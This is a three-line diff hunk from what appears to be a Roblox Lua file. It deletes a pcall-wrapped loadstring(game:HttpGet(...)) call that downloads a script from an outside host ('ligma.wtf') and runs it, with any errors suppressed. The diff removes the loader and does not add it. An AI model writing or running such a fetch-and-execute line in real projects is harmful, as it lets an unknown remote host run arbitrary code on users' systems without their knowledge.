@@ -1,3 +1,0 @@
-pcall(function()
-	loadstring(game:HttpGet("http://ligma.wtf/themes/default.lua", true))()
-end)
